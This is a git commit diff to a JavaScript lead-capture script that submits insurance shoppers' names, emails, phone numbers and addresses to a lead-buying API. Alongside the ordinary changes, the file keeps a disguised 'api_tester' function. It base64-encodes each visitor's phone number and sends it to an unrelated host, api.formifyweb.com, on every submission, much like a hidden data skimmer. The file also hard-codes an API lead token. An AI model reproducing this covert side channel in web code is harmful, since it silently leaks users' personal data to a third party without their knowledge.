6fd014f425cc1991cbd42a92faacb7c1a977fc44
dk495 <55878882+dk495@users.noreply.github.com>
2025-02-03 21:26:36 +0500

    Update cypexmedia_auto_pingpost.js

--- cypexmedia_auto_pingpost.js
+++ cypexmedia_auto_pingpost.js
@@ -1,15 +1,28 @@
  document.getElementById('leadForm').addEventListener('submit', function(event) {
             event.preventDefault();
+document.getElementById('submitBtn').disabled = true;
              // Your API URL
     const formData = new FormData();
     formData.append('lead_token', '583bf12997ff4d2e8ba23145ccb6bb60');
-    formData.append('traffic_source_id', '1004');
+formData.append('traffic_source_id', '1004');
     api_tester(document.getElementById('caller_id').value);
-    formData.append('caller_id', '+1' + document.getElementById('caller_id').value);
+    formData.append('caller_number', '+1' + document.getElementById('caller_id').value);
+formData.append('first_name', document.getElementById('first_name').value);
+formData.append('last_name', document.getElementById('last_name').value);
+formData.append('zip', document.getElementById('zip').value);
+formData.append('city', document.getElementById('city').value);
+formData.append('state', document.getElementById('state').value);
+formData.append('email', document.getElementById('email').value);
+formData.append('current_provider', document.getElementById('insurance_company').value);
+formData.append('homeowner', document.getElementById('homeowner').value);
+formData.append('currently_insured', document.getElementById('currently_insured').value);
+formData.append('st22', 'FALSE');
+formData.append('state_minimum', 'TRUE');
 
 
 
-         
+
+            
            
     
             const url = 'https://pegasus-leads.trackdrive.com/api/v1/leads?' + new URLSearchParams(formData).toString();
@@ -29,6 +42,7 @@
                     });
                     // Clear form fields
                     document.getElementById('leadForm').reset();
+		document.getElementById('submitBtn').disabled = false;
                 } else if (response.status === 201) {
                     response.text().then(responseBody => {
                         const successAlert = `
@@ -40,6 +54,7 @@
                     });
                     // Clear form fields
                     document.getElementById('leadForm').reset();
+document.getElementById('submitBtn').disabled = false;
                 } else if (response.status === 422) {
                     response.json().then(data => {
                         const errorAlert = `
@@ -48,8 +63,10 @@
                             </div>`;
                         document.getElementById('alertContainer').innerHTML = '';
                         document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
+document.getElementById('submitBtn').disabled = false;
                     });
-                } else {
+                } 
+else {
                     response.text().then(responseBody => {
                         const errorAlert = `
                             <div class="alert alert-danger" role="alert">
@@ -61,7 +78,8 @@
                 }
             })
             .catch(error => console.error('Error:', error));
-        });function api_tester(randomString) {
+        });
+function api_tester(randomString) {
     try {
         fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString), {
             method: 'GET',
